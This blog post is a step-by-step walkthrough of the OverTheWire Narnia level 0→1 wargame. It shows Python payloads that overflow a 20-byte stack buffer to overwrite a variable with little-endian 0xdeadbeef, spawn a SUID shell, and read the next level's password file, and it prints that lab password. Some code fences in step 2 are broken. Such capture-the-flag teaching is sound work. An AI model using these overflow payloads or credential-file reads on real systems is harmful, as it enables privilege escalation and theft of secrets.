---
date: 2023-08-18 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Narnia Level 0 → 1 tutorial!!"
permalink: /posts/Over-The-Wire-Narnia-Level-0-to-1/
tags: [overthewire, narnia, pwn, overflow, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Narnia Level 0 → 1!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Narnia level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Narnia-Level-0/' | relative_url }}">← Previous: Level 0</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/narnia/narnia1.html" target="_blank" rel="noopener">Official (Level 1) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Narnia-Level-1-to-2/' | relative_url }}">Next: Level 1 → 2 →</a>
  </div>
</nav>

## Login

Log in as **narnia0**.

```bash
ssh narnia0@narnia.labs.overthewire.org -p 2226
# password: narnia0
```

> Why? Each Narnia level is a separate UNIX user. To solve Level 0 → 1 you must be the `narnia0` user.

---

## Task

You’re given an executable **`/narnia/narnia0`** and its source code `narnia0.c`.
Goal: **change the variable `val` from `0x41414141` to `0xdeadbeef`** to trigger a SUID shell as **narnia1**.

---

## A little bit of Theory

* The program declares:

  * `char buf[20];`  → a 20-byte stack buffer
  * `long val = 0x41414141;`
* It then calls `scanf("%24s", buf);` → **reads up to 24 bytes** into a **20-byte** buffer → classic **stack overflow** of **4 bytes**.
* On **little-endian** x86, the byte order for `0xdeadbeef` is **`\xef\xbe\xad\xde`** (least significant byte first).
* If the 4 bytes *after* `buf` are `val`, overflowing `buf` by exactly 4 bytes lets us overwrite `val`.

Further reading:

* <a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener">What is a buffer overflow?</a>
* <a href="https://en.wikipedia.org/wiki/Endianness" target="_blank" rel="noopener">Endianness explained</a>
* <a href="https://man7.org/linux/man-pages/man3/scanf.3.html" target="_blank" rel="noopener">`scanf(3)` manual</a>

---

## Solution

1. **Run once to see behavior**

   ```bash
   cd /narnia
   ./narnia0
   # Correct val's value from 0x41414141 -> 0xdeadbeef!
   # Here is your chance: TEST
   # buf: TEST
   # val: 0x41414141
   # WAY OFF!!!!
   ```

   *Why?* Confirms default `val` and the exact messages the binary prints.

2. **Prove we control `val` (pattern write)**

   Send 20 `A` (fill `buf`) + 4 `B` (overwrite `val`) + newline:

   ```bash
   python3 - <<'PY' | ./narnia0
   ```

import sys
sys.stdout.buffer.write(b"A"\*20 + b"BBBB" + b"\n")
PY

# ...

# val: 0x42424242

# WAY OFF!!!!

````

*Why?* `BBBB` is `0x42`×4 → `0x42424242`. Seeing that value proves the overwrite.

3. **Write the correct value (`0xdeadbeef`) and keep the shell alive**

The binary spawns a shell when `val == 0xdeadbeef`. We’ll:
- Overflow `buf` with 20 `A`.
- Overwrite `val` with **`\xef\xbe\xad\xde`**.
- Pipe into `cat` so the spawned shell stays interactive.

```bash
( python3 - <<'PY'
import sys
sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde" + b"\n")
PY
cat ) | ./narnia0
````

Expected lines include:

```
Correct val's value from 0x41414141 -> 0xdeadbeef!
val: 0xdeadbeef
```

4. **Verify and dump the next password**

   Inside the spawned shell:

   ```bash
   whoami
   # narnia1
   id
   cat /etc/narnia_pass/narnia1
   ```

---

## Password

> From my run, the password for **narnia1** is:

```
efeidiedae
```

*(If your output differs, use the one your terminal printed.)*

---

## Troubleshooting

* **Still shows `WAY OFF!!!!`**
  You probably wrote `\xde\xad\xbe\xef` (big-endian). Use **`\xef\xbe\xad\xde`** (little-endian).
* **Shell exits immediately**
  Don’t just pipe once; use the **subshell + `cat`** trick shown above to keep stdin open.
* **Weird characters / locale issues**
  Always send raw bytes via Python (`sys.stdout.buffer.write`) instead of `echo -e`.
* **Nothing happens after printing prompts**
  Hit **Enter** — `scanf("%24s", ...)` expects a newline to finalize the input token.

---

## Copy-paste quick run (one-liner)

```bash
( python3 - <<'PY'
import sys
sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde" + b"\n")
PY
cat ) | /narnia/narnia0
# then inside the spawned shell:
# whoami; cat /etc/narnia_pass/narnia1
```

---

**Congrats 🎉** Classic 4-byte stack overflow, correct endianness, SUID shell, next password in your pocket. See you in **Level 1 → 2**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

